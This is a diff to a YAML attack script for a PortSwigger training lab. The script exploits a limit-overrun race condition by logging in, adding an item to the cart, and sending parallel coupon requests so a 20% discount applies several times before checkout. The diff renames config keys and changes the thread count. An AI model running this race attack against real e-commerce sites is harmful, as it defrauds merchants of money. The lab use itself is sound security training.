@@ -23,7 +23,7 @@ metadata:
     Exploits race condition in POST /cart/coupon to apply 20% discount 
     multiple times, bypassing single-use validation.
 
-config:
+target:
   host: "{{ env('LAB_HOST', '0a1b2c3d4e5f.web-security-academy.net') }}"
   port: 443
   tls:
@@ -32,13 +32,13 @@ config:
   http:
     follow_redirects: false
 
-entrypoints:
-  - state: get_login_page
-    input:
-      username: "wiener"
-      password: "peter"
-      coupon_code: "PROMO20"
-      product_id: "1"
+entrypoint:
+  state: get_login_page
+  input:
+    username: "wiener"
+    password: "peter"
+    coupon_code: "PROMO20"
+    product_id: "1"
 
 # ============================================================================
 # STATES
@@ -54,7 +54,7 @@ states:
     description: "Get CSRF token from login page"
     request: |
       GET /login HTTP/1.1
-      Host: {{ config.host }}
+      Host: {{ target.host }}
 
     extract:
       csrf:
@@ -70,7 +70,7 @@ states:
         ╔═══════════════════════════════════════════════════════════════════════╗
         ║  🦎 PortSwigger - Limit Overrun Race Condition                        ║
         ╠═══════════════════════════════════════════════════════════════════════╣
-        ║  🎯 Target: {{ "%-57s" | format(config.host)                       }} ║
+        ║  🎯 Target: {{ "%-57s" | format(target.host)                       }} ║
         ║  🎟️  Coupon: {{ "%-57s" | format(coupon_code)                      }} ║
         ╚═══════════════════════════════════════════════════════════════════════╝
 
@@ -82,7 +82,7 @@ states:
     description: "Authenticate with credentials"
     request: |
       POST /login HTTP/1.1
-      Host: {{ config.host }}
+      Host: {{ target.host }}
       Content-Type: application/x-www-form-urlencoded
       Cookie: session={{ get_login_page.session }}
       
@@ -119,7 +119,7 @@ states:
     description: "Add Leather Jacket to cart"
     request: |
       POST /cart HTTP/1.1
-      Host: {{ config.host }}
+      Host: {{ target.host }}
       Content-Type: application/x-www-form-urlencoded
       Cookie: session={{ login.session }}
       
@@ -137,7 +137,7 @@ states:
     description: "Check cart before attack"
     request: |
       GET /cart HTTP/1.1
-      Host: {{ config.host }}
+      Host: {{ target.host }}
       Cookie: session={{ login.session }}
 
     extract:
@@ -167,14 +167,14 @@ states:
     description: "Race condition - apply coupon multiple times"
     request: |
       POST /cart/coupon HTTP/1.1
-      Host: {{ config.host }}
+      Host: {{ target.host }}
       Content-Type: application/x-www-form-urlencoded
       Cookie: session={{ login.session }}
       
       csrf={{ view_cart_before.csrf }}&coupon={{ coupon_code }}
 
     race:
-      threads: 20
+      threads: 2
       sync_mechanism: barrier
       connection_strategy: multiplexed
       thread_propagation: single
@@ -212,7 +212,7 @@ states:
     description: "Check cart after attack"
     request: |
       GET /cart HTTP/1.1
-      Host: {{ config.host }}
+      Host: {{ target.host }}
       Cookie: session={{ login.session }}
 
     extract:
@@ -249,7 +249,7 @@ states:
     description: "Complete purchase"
     request: |
       POST /cart/checkout HTTP/1.1
-      Host: {{ config.host }}
+      Host: {{ target.host }}
       Content-Type: application/x-www-form-urlencoded
       Cookie: session={{ login.session }}
       
